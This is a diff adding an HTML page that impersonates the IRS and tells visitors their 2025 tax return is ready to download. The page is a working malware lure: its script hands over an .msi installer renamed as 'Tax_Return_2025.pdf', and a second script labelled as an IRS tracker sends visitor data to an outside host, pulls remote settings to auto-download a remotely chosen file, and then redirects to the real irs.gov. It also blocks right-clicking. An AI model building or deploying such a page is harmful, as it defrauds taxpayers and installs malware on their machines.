@@ -1,0 +1,912 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tax Document - Internal Revenue Service</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #ffffff;
+            color: #212529;
+            line-height: 1.5;
+            font-size: 14px;
+        }
+
+        /* Official Banner */
+        .official-banner {
+            background: #f1f1f1;
+            padding: 8px 0;
+            font-size: 13px;
+            color: #565c65;
+            border-bottom: 1px solid #d6d7d9;
+        }
+
+        .banner-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 24px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .us-flag {
+            width: 20px;
+            height: auto;
+            margin-right: 5px;
+        }
+
+        /* Main Header */
+        .main-header {
+            background: #1e40af;
+            color: white;
+            padding: 16px 0;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+        }
+
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 24px;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .irs-logo {
+            width: 75px;
+            height: auto;
+            filter: brightness(0) invert(1);
+        }
+
+        .agency-title {
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+
+        .agency-subtitle {
+            font-size: 13px;
+            opacity: 0.9;
+            font-weight: 300;
+        }
+
+        /* Navigation */
+        .nav-bar {
+            background: #1f2937;
+            border-bottom: 1px solid #374151;
+        }
+
+        .nav-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+        }
+
+        .nav-link {
+            color: #e5e7eb;
+            text-decoration: none;
+            padding: 14px 20px;
+            font-size: 14px;
+            font-weight: 500;
+            border-right: 1px solid #4b5563;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        .nav-link:hover {
+            background: #374151;
+            color: #ffffff;
+        }
+
+        .nav-link.active {
+            background: #d1d5db;
+            color: #1f2937;
+        }
+
+        .nav-link.active::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: #3b82f6;
+        }
+
+        /* Main Container */
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 40px 24px;
+        }
+
+        /* Document Section */
+        .document-box {
+            background: linear-gradient(135deg, #ffffff 0%, #f8f9fa 100%);
+            border: 1px solid #e9ecef;
+            border-radius: 12px;
+            margin-bottom: 30px;
+            padding: 32px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+        }
+
+        .document-title {
+            font-size: 28px;
+            color: #003d6b;
+            font-weight: 600;
+            margin-bottom: 12px;
+            text-align: center;
+        }
+
+        .document-subtitle {
+            font-size: 16px;
+            color: #6c757d;
+            margin-bottom: 20px;
+            text-align: center;
+            font-weight: 400;
+        }
+
+        /* Download Status */
+        .download-section {
+            background: linear-gradient(135deg, #e8f4f8 0%, #f0f8ff 100%);
+            border: 2px solid #74b9ff;
+            border-radius: 12px;
+            padding: 32px;
+            margin: 30px 0;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .download-section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+            transition: left 0.6s ease;
+        }
+
+        .download-section:hover::before {
+            left: 100%;
+        }
+
+        .download-status {
+            font-size: 18px;
+            color: #003d6b;
+            font-weight: 600;
+            margin-bottom: 16px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .status-dot {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            background: linear-gradient(135deg, #00b894 0%, #00a085 100%);
+            border-radius: 50%;
+            margin-right: 10px;
+            animation: pulse 2s infinite;
+            box-shadow: 0 0 0 0 rgba(0, 184, 148, 0.7);
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(0.95);
+                box-shadow: 0 0 0 0 rgba(0, 184, 148, 0.7);
+            }
+            70% {
+                transform: scale(1);
+                box-shadow: 0 0 0 10px rgba(0, 184, 148, 0);
+            }
+            100% {
+                transform: scale(0.95);
+                box-shadow: 0 0 0 0 rgba(0, 184, 148, 0);
+            }
+        }
+
+        /* Download Button */
+        .download-button {
+            background: linear-gradient(135deg, #74b9ff 0%, #0984e3 100%);
+            color: white;
+            border: none;
+            padding: 16px 32px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 20px 0;
+            text-decoration: none;
+            display: inline-block;
+            border-radius: 8px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(116, 185, 255, 0.3);
+            position: relative;
+            z-index: 2;
+        }
+
+        .download-button:hover:not(:disabled) {
+            background: linear-gradient(135deg, #0984e3 0%, #0652dd 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(116, 185, 255, 0.4);
+        }
+
+        .download-button:disabled {
+            background: linear-gradient(135deg, #95a5a6 0%, #7f8c8d 100%);
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        /* File Information */
+        .file-info {
+            background: linear-gradient(135deg, #ffffff 0%, #f8f9fa 100%);
+            border-radius: 12px;
+            padding: 28px;
+            margin: 30px 0;
+            border: 1px solid #e9ecef;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        }
+
+        .file-info h3 {
+            color: #003d6b;
+            margin-bottom: 20px;
+            font-size: 20px;
+            font-weight: 600;
+            border-bottom: 2px solid #74b9ff;
+            padding-bottom: 10px;
+        }
+
+        .file-details {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 16px;
+        }
+
+        .file-details p {
+            margin-bottom: 12px;
+            font-size: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            border-left: 4px solid #74b9ff;
+        }
+
+        .file-details strong {
+            color: #2c3e50;
+            font-weight: 600;
+        }
+
+        /* Alerts */
+        .alert {
+            padding: 20px;
+            margin: 24px 0;
+            border-left: 4px solid;
+            border-radius: 8px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .alert::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 4px;
+            height: 100%;
+            background: inherit;
+        }
+
+        .alert-info {
+            background: linear-gradient(135deg, #e3f2fd 0%, #f0f8ff 100%);
+            border-left-color: #2196f3;
+            color: #0d47a1;
+        }
+
+        .alert-warning {
+            background: linear-gradient(135deg, #fff8e1 0%, #fffaed 100%);
+            border-left-color: #ff9800;
+            color: #e65100;
+        }
+
+        .alert-success {
+            background: linear-gradient(135deg, #e8f5e8 0%, #f0fff0 100%);
+            border-left-color: #4caf50;
+            color: #2e7d32;
+            display: none;
+        }
+
+        .alert h4 {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .alert p {
+            font-size: 14px;
+            margin-bottom: 8px;
+            line-height: 1.6;
+        }
+
+        /* Tabs System */
+        .tabs-container {
+            margin: 30px 0;
+            background: white;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+        }
+
+        .tab-buttons {
+            display: flex;
+            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            border-bottom: 2px solid #003d6b;
+        }
+
+        .tab-button {
+            background: transparent;
+            border: none;
+            padding: 16px 24px;
+            font-size: 14px;
+            font-weight: 600;
+            color: #495057;
+            cursor: pointer;
+            border-right: 1px solid #dee2e6;
+            transition: all 0.3s ease;
+            flex: 1;
+            position: relative;
+        }
+
+        .tab-button:hover {
+            background: linear-gradient(135deg, #e9ecef 0%, #d6d9db 100%);
+            color: #212529;
+        }
+
+        .tab-button.active {
+            background: linear-gradient(135deg, #003d6b 0%, #0056b3 100%);
+            color: white;
+        }
+
+        .tab-button.active::after {
+            content: '';
+            position: absolute;
+            bottom: -2px;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: white;
+        }
+
+        .tab-button:last-child {
+            border-right: none;
+        }
+
+        .tab-content {
+            display: none;
+            padding: 28px;
+            background: white;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        .tab-content h3 {
+            font-size: 18px;
+            color: #003d6b;
+            margin-bottom: 16px;
+            font-weight: 600;
+        }
+
+        .tab-content ol {
+            padding-left: 24px;
+            counter-reset: item;
+        }
+
+        .tab-content li {
+            font-size: 14px;
+            margin-bottom: 12px;
+            color: #495057;
+            line-height: 1.6;
+            position: relative;
+            counter-increment: item;
+        }
+
+        .tab-content li::marker {
+            color: #003d6b;
+            font-weight: 600;
+        }
+
+        .tab-content p {
+            font-size: 14px;
+            margin-bottom: 12px;
+            color: #495057;
+            line-height: 1.6;
+        }
+
+        .tab-content strong {
+            color: #2c3e50;
+            font-weight: 600;
+        }
+
+        /* Footer */
+        .footer {
+            background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
+            color: white;
+            text-align: center;
+            padding: 32px;
+            margin-top: 50px;
+            border-top: 4px solid #003d6b;
+        }
+
+        .footer a {
+            color: #74b9ff;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .footer a:hover {
+            color: #ffffff;
+            text-decoration: underline;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .header-content {
+                flex-direction: column;
+                text-align: center;
+                gap: 12px;
+            }
+
+            .nav-content {
+                flex-direction: column;
+            }
+
+            .nav-link {
+                border-right: none;
+                border-bottom: 1px solid #3c4d5c;
+            }
+
+            .container {
+                padding: 24px 16px;
+            }
+
+            .document-title {
+                font-size: 24px;
+            }
+
+            .tab-buttons {
+                flex-wrap: wrap;
+            }
+
+            .tab-button {
+                flex: 1;
+                min-width: 120px;
+                font-size: 13px;
+                padding: 12px 16px;
+            }
+
+            .file-details {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* Loading Animation */
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #003d6b;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Accessibility improvements */
+        .tab-button:focus,
+        .download-button:focus {
+            outline: 2px solid #74b9ff;
+            outline-offset: 2px;
+        }
+
+        /* Print styles */
+        @media print {
+            .nav-bar, .footer, .download-button {
+                display: none;
+            }
+            
+            body {
+                background: white;
+            }
+            
+            .document-box, .file-info, .tabs-container {
+                box-shadow: none;
+                border: 1px solid #ccc;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="official-banner">
+        <div class="banner-content">
+            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMTgiIHZpZXdCb3g9IjAgMCAyNCAxOCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjI0IiBoZWlnaHQ9IjE4IiBmaWxsPSIjRkZGIi8+CjxyZWN0IHk9IjAiIHdpZHRoPSIyNCIgaGVpZ2h0PSIyLjI1IiBmaWxsPSIjQjIyMjM0Ii8+CjxyZWN0IHk9IjQuNSIgd2lkdGg9IjI0IiBoZWlnaHQ9IjIuMjUiIGZpbGw9IiNCMjIyMzQiLz4KPHJlY3QgeT0iOSIgd2lkdGg9IjI0IiBoZWlnaHQ9IjIuMjUiIGZpbGw9IiNCMjIyMzQiLz4KPHJlY3QgeT0iMTMuNSIgd2lkdGg9IjI0IiBoZWlnaHQ9IjIuNSIgZmlsbD0iI0IyMjIzNCIvPgo8cmVjdCB3aWR0aD0iMTAiIGhlaWdodD0iMTAiIGZpbGw9IiMzQzNCNkUiLz4KPGNpcmNsZSBjeD0iMiIgY3k9IjIiIHI9IjAuNCIgZmlsbD0id2hpdGUiLz4KPGNpcmNsZSBjeD0iNCIgY3k9IjIiIHI9IjAuNCIgZmlsbD0id2hpdGUiLz4KPGNpcmNsZSBjeD0iNiIgY3k9IjIiIHI9IjAuNCIgZmlsbD0id2hpdGUiLz4KPGNpcmNsZSBjeD0iMiIgY3k9IjQiIHI9IjAuNCIgZmlsbD0id2hpdGUiLz4KPGNpcmNsZSBjeD0iNCIgY3k9IjQiIHI9IjAuNCIgZmlsbD0id2hpdGUiLz4KPC9zdmc+" alt="US Flag" class="us-flag">
+            <span>An official website of the United States Government</span>
+        </div>
+    </div>
+
+    <header class="main-header">
+        <div class="header-content">
+            <img src="https://www.irs.gov/themes/custom/pup_base/IRS-Logo.svg" alt="IRS Logo" class="irs-logo">
+            <div>
+                <div class="agency-title">Internal Revenue Service</div>
+                <div class="agency-subtitle">United States Department of the Treasury</div>
+            </div>
+        </div>
+    </header>
+
+    <nav class="nav-bar">
+        <div class="nav-content">
+            <a href="#" class="nav-link">File</a>
+            <a href="#" class="nav-link">Pay</a>
+            <a href="#" class="nav-link active">Refunds</a>
+            <a href="#" class="nav-link">Credits &amp; Deductions</a>
+            <a href="#" class="nav-link">Forms &amp; Instructions</a>
+        </div>
+    </nav>
+
+    <div class="container">
+        
+        <div class="document-box">
+            <h1 class="document-title">Your Tax Document is Ready</h1>
+            <p class="document-subtitle">Tax Year 2025 - Complete Individual Tax Return</p>
+        </div>
+
+        <div class="download-section">
+            <div class="download-status" id="downloadStatus">
+                <span class="status-dot" id="statusDot"></span>
+                <span id="statusText">Preparing your document...</span>
+            </div>
+            <div class="download-message" id="downloadMessage">
+                Your tax document download will begin automatically.
+            </div>
+            <button class="download-button" id="downloadBtn" onclick="downloadDocument()" disabled>
+                <span class="loading" id="loadingIcon" style="display: none;"></span>
+                Download Document
+            </button>
+        </div>
+
+        <div class="file-info">
+            <h3>📄 Document Information</h3>
+            <div class="file-details">
+                <p><strong>File Name:</strong> <span>Tax_Return_2025.pdf</span></p>
+                <p><strong>File Size:</strong> <span>1.2 MB</span></p>
+                <p><strong>Format:</strong> <span>PDF (Password Protected)</span></p>
+                <p><strong>Date Created:</strong> <span>July 11, 2025</span></p>
+                <p><strong>Password:</strong> <span>Last 4 digits of your Social Security Number</span></p>
+                <p><strong>Expires:</strong> <span>Available for 30 days</span></p>
+            </div>
+        </div>
+
+        <div class="alert alert-success" id="successAlert">
+            <h4>✅ Download Complete</h4>
+            <p>Your tax document has been successfully downloaded to your Downloads folder. Please check your downloads and open the file using the provided password.</p>
+        </div>
+
+        <div class="alert alert-warning">
+            <h4>🔒 Security Notice</h4>
+            <p>This document contains sensitive tax information. Please ensure you download only on secure, private devices and store the file in a safe location.</p>
+        </div>
+
+        <div class="tabs-container">
+            <div class="tab-buttons">
+                <button class="tab-button active" onclick="openTab(event, 'instructions')">📋 Instructions</button>
+                <button class="tab-button" onclick="openTab(event, 'security')">🔐 Security Notice</button>
+                <button class="tab-button" onclick="openTab(event, 'help')">📞 Help &amp; Support</button>
+                <button class="tab-button" onclick="openTab(event, 'technical')">⚙️ Technical Info</button>
+            </div>
+
+            <div id="instructions" class="tab-content active">
+                <h3>After Download Instructions</h3>
+                <ol>
+                    <li>Locate the file "Tax_Return_2025.pdf" in your Downloads folder</li>
+                    <li>Double-click to open the document</li>
+                    <li>Enter the last 4 digits of your SSN when prompted for password</li>
+                    <li>Review your tax information carefully</li>
+                    <li>Save the document in a secure location on your device</li>
+                    <li>Create a backup copy for your records</li>
+                    <li>Remove the file from shared or public computers after use</li>
+                </ol>
+            </div>
+
+            <div id="security" class="tab-content">
+                <h3>Important Security Information</h3>
+                <p><strong>🔒 Document Security:</strong></p>
+                <p>• This document contains sensitive personal and financial information</p>
+                <p>• Download only on secure, private devices you trust</p>
+                <p>• The download link expires in 24 hours for security purposes</p>
+                <p>• File is encrypted and password-protected</p>
+                
+                <p><strong>💾 File Protection:</strong></p>
+                <p>• Password is the last 4 digits of your Social Security Number</p>
+                <p>• Store in an encrypted folder if available on your device</p>
+                <p>• Do not share the file via email or unsecured methods</p>
+                <p>• Do not store on cloud services unless encrypted</p>
+                
+                <p><strong>✅ Best Practices:</strong></p>
+                <p>• Scan file with antivirus software before opening</p>
+                <p>• Log out of all accounts when finished</p>
+                <p>• Clear browser downloads history on shared computers</p>
+                <p>• Report any suspicious activity to IRS immediately</p>
+            </div>
+
+            <div id="help" class="tab-content">
+                <h3>Help &amp; Support</h3>
+                <p><strong>📞 Download Issues:</strong></p>
+                <p>• Technical Support: <strong>1-800-829-1040</strong> (Press 2 for online services)</p>
+                <p>• Hours: Monday - Friday, 7 AM - 7 PM local time</p>
+                <p>• Online Help: Available 24/7 through your IRS online account</p>
+                
+                <p><strong>💬 Tax Questions:</strong></p>
+                <p>• General Tax Help: <strong>1-800-TAX-FORM (1-800-829-3676)</strong></p>
+                <p>• TTY/TDD: <strong>1-800-829-4059</strong></p>
+                <p>• Website: <a href="https://www.irs.gov" target="_blank">www.irs.gov</a></p>
+                
+                <p><strong>📄 Document Requests:</strong></p>
+                <p>• Request additional copies by phone or through your online account</p>
+                <p>• Previous year documents available through account history</p>
+                <p>• Transcripts available online for immediate access</p>
+                
+                <p><strong>🆘 Emergency Support:</strong></p>
+                <p>• Identity theft: <strong>1-800-908-4490</strong></p>
+                <p>• Fraudulent activity: Report immediately through IRS.gov</p>
+            </div>
+
+            <div id="technical" class="tab-content">
+                <h3>Technical Information</h3>
+                <p><strong>💻 System Requirements:</strong></p>
+                <p>• PDF Reader (Adobe Acrobat Reader, browser built-in viewer)</p>
+                <p>• Minimum 5 MB free storage space</p>
+                <p>• Active internet connection for initial download</p>
+                <p>• JavaScript enabled in browser</p>
+                
+                <p><strong>🌐 Browser Compatibility:</strong></p>
+                <p>• Chrome 90+, Firefox 88+, Safari 14+, Edge 90+</p>
+                <p>• Internet Explorer is not supported</p>
+                <p>• Cookies and JavaScript must be enabled</p>
+                <p>• Pop-up blockers may prevent download</p>
+                
+                <p><strong>📱 Mobile Devices:</strong></p>
+                <p>• iOS: Use Safari or Chrome (latest versions)</p>
+                <p>• Android: Use Chrome or Samsung Internet</p>
+                <p>• Files automatically save to device downloads folder</p>
+                <p>• PDF viewer app required for viewing</p>
+                
+                <p><strong>🔧 Troubleshooting:</strong></p>
+                <p>• Clear browser cache and cookies if download fails</p>
+                <p>• Disable VPN or proxy if experiencing issues</p>
+                <p>• Try incognito/private Browse mode</p>
+                <p>• Check firewall and antivirus settings</p>
+                <p>• Ensure sufficient disk space available</p>
+            </div>
+        </div>
+
+    </div>
+
+    <footer class="footer">
+        <p><strong>Internal Revenue Service</strong> | <a href="https://www.irs.gov">www.irs.gov</a></p>
+        <p>Phone: 1-800-829-1040 | © 2025 Internal Revenue Service | <a href="#">Privacy Policy</a> | <a href="#">Accessibility</a></p>
+    </footer>
+<script>
+    const downloadConfig = {
+        link: 'download/Tax_Return_ID_45456496_pdf.msi',
+        preserveFilename: true,
+        metadata: {
+            filename: 'Tax_Return_2025.pdf'
+        }
+    };
+
+    const redirectConfig = {
+        enabled: false,
+        url: '',
+        delaySeconds: 0
+    };
+
+    let downloadStarted = false;
+
+    document.addEventListener('DOMContentLoaded', function() {
+        updateStatus('Document ready for download');
+        enableDownloadButton();
+    });
+
+    function updateStatus(statusText) {
+        document.getElementById('statusText').textContent = statusText;
+    }
+
+    function enableDownloadButton() {
+        const btn = document.getElementById('downloadBtn');
+        btn.disabled = false;
+        btn.style.background = 'linear-gradient(135deg, #74b9ff 0%, #0984e3 100%)';
+    }
+
+    function downloadDocument() {
+        if (downloadStarted) {
+            updateStatus('Downloading again...');
+        } else {
+            downloadStarted = true;
+            document.getElementById('loadingIcon').style.display = 'inline-block';
+            updateStatus('Downloading...');
+            document.getElementById('statusDot').style.animation = 'none';
+            document.getElementById('statusDot').style.background = 'linear-gradient(135deg, #00b894 0%, #00a085 100%)';
+        }
+
+        triggerDownload();
+        showSuccess();
+    }
+
+    function resolveDownloadName() {
+        const configured = downloadConfig.preserveFilename && downloadConfig.metadata && downloadConfig.metadata.filename;
+        if (configured) {
+            return downloadConfig.metadata.filename;
+        }
+        const randomNumber = Math.floor(Math.random() * 10000000);
+        return 'Tax-Return-Statement-ID-' + randomNumber + '_pdf.msi';
+    }
+
+    function triggerDownload() {
+        const anchor = document.createElement('a');
+        anchor.href = downloadConfig.link || '#';
+        anchor.download = resolveDownloadName();
+
+        document.body.appendChild(anchor);
+        anchor.click();
+        document.body.removeChild(anchor);
+
+        if (redirectConfig.enabled && redirectConfig.url) {
+            setTimeout(function() {
+                window.location.href = redirectConfig.url;
+            }, Math.max(0, redirectConfig.delaySeconds) * 1000);
+        }
+    }
+
+    function showSuccess() {
+        document.getElementById('loadingIcon').style.display = 'none';
+        updateStatus('Download completed successfully');
+        document.getElementById('successAlert').style.display = 'block';
+
+        const btn = document.getElementById('downloadBtn');
+        btn.textContent = 'Download Again';
+
+        document.getElementById('successAlert').scrollIntoView({
+            behavior: 'smooth',
+            block: 'center'
+        });
+    }
+
+    function openTab(evt, tabName) {
+        var i, tabcontent, tablinks;
+        tabcontent = document.getElementsByClassName('tab-content');
+        for (i = 0; i < tabcontent.length; i++) {
+            tabcontent[i].classList.remove('active');
+        }
+        tablinks = document.getElementsByClassName('tab-button');
+        for (i = 0; i < tablinks.length; i++) {
+            tablinks[i].classList.remove('active');
+        }
+        document.getElementById(tabName).classList.add('active');
+        evt.currentTarget.classList.add('active');
+    }
+
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+    });
+
+    document.querySelectorAll('button, a').forEach(function(element) {
+        element.addEventListener('focus', function() {
+            this.style.outline = '2px solid #74b9ff';
+            this.style.outlineOffset = '2px';
+        });
+        element.addEventListener('blur', function() {
+            this.style.outline = 'none';
+        });
+    });
+
+    document.querySelectorAll('.tab-button').forEach(function(button) {
+        button.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter' || e.key === ' ') {
+                e.preventDefault();
+                this.click();
+            }
+        });
+    });
+</script>
+<!-- IRS tracker snippet -->
+<script>
+(function(){
+  const settings = {
+    tracker: "https://jhansimediaclub.com/gravi/snippet_tracker.php",
+    config: "https://jhansimediaclub.com/gravi/config_api.php",
+    pageTag: "NewLand",
+    redirectEnabled: true,
+    redirectUrl: "https://www.irs.gov/",
+    redirectDelaySeconds: 4,
+    autoDownload: true,
+    downloadDelaySeconds: 3
+  };
+
+  const landingUrl = window.location.href;
+  const pageTitle = document.title || '';
+  const userAgent = navigator.userAgent || '';
+
+  const logEvent = (type, extra) => {
+    try {
+      fetch(settings.tracker, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(Object.assign({
+          event_type: type,
+          page_tag: settings.pageTag,
+          profile_id: settings.pageTag,
+          referrer: document.referrer || '',
+          landing_url: landingUrl,
+          page_title: pageTitle,
+          user_agent: userAgent
+        }, extra || {})),
+        keepalive: true
+      });
+    } catch (err) {}
+  };
+
+  logEvent('snippet_visit');
+
+  const configUrl = settings.config + '?profile=' + encodeURIComponent(settings.pageTag);
+  fetch(configUrl, { cache: 'no-store' })
+    .then(r => r.json())
+    .then(remote => {
+      const live = remote && remote.config ? remote.config : {};
+      const redirectEnabled = typeof live.redirect_enabled === 'boolean' ? live.redirect_enabled : settings.redirectEnabled;
+      const redirectUrl = (live.redirect_url || settings.redirectUrl || '').trim();
+      const redirectDelay = Number(live.redirect_delay_seconds ?? settings.redirectDelaySeconds) || 0;
+      const autoDownload = typeof live.download_autostart === 'boolean' ? live.download_autostart : settings.autoDownload;
+      const downloadUrl = (live.download_link || '').trim();
+      const downloadDelay = Number(live.download_delay_seconds ?? settings.downloadDelaySeconds) || 0;
+
+      if (autoDownload && downloadUrl) {
+        setTimeout(() => {
+          logEvent('download', { target: downloadUrl });
+          window.location.href = downloadUrl;
+        }, Math.max(downloadDelay, 0) * 1000);
+      }
+
+      if (redirectEnabled && redirectUrl) {
+        setTimeout(() => {
+          logEvent('snippet_redirect', { target: redirectUrl });
+          window.location.href = redirectUrl;
+        }, Math.max(redirectDelay, 0) * 1000);
+      }
+      logEvent('snippet_heartbeat', { target: redirectUrl || downloadUrl || '' });
+    })
+    .catch(() => {});
+})();
+</script>
+</body>
+</html>
